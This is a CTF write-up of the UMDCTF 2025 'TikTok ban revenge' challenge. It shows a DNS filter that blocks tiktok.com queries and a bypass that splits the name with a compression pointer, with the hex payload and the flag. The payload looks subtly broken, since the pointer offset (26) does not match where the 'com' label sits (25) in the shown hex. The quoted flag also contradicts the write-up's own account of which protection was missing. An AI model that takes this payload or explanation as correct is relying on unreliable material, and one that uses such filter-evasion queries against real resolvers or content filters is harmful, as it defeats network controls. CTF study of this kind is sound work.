# TikTok ban revenge

UMDCTF 2025, misc. The sequel to TikTok ban. This time the filter lowercases the request before
checking, so the case trick is dead. DNS name compression gets around it instead.

## The filter

`filter.py` runs dnsmasq with the flag in a TXT record for tiktok.com, then forwards a query
only if `b'tiktok\x03com'` is not in `req.lower()`:

```python
if b'tiktok\x03com' in req.lower():
    print("Sorry, TikTok isn't available right now...")
else:
    sock.sendto(req, (dns_ip_addr, dns_port))
```

Lowercasing closes the `TiKToK` bypass. The query still has to resolve tiktok.com without the
bytes `tiktok\x03com` ever appearing in it.

## Solve

DNS supports compression pointers: a two-byte `\xc0 <offset>` stands in for a name stored
elsewhere in the message. Split the name so `tiktok` and `com` are never adjacent in the bytes.
The query holds the label `\x06tiktok` followed by a pointer to a `\x03com\x00` placed later:

```python
qname_part1 = b'\x06tiktok'       # label "tiktok"
pointer     = b'\xc0\x1a'         # pointer to offset 26
# ... later in the packet:
pointer_target = b'\x03com\x00'   # label "com" at offset 26
```

The literal `tiktok\x03com` never appears, so the filter passes it:

```text
>>> payload.hex()
'1234010000010000000000000674696b746f6bc01a001000010003636f6d00'
>>> b'tiktok\x03com' in payload.lower()
False
```

In the hex, `0674696b746f6b` is the `tiktok` label and `03636f6d00` is the `com` label; the
`c01a` pointer between them is what stitches the name back to tiktok.com. dnsmasq follows that
forward pointer and answers with the flag. The UMDCTF instance is offline now, and this relies
on dnsmasq accepting a forward-pointing compression pointer, which stricter parsers reject, so
the bypass check above is the piece that reproduces locally.

## Flag

```text
UMDCTF{we_remembered_pointer_compression_but_forgor_about_case_insensitivity_:skull:}
```

The name is the point: the author guarded against case with `.lower()` but left compression
pointers wide open.

## Files

```text
filter.py   the challenge proxy (lowercases the request, blocks tiktok.com)
solve.py    builds the compression-pointer query and parses the TXT answer
```
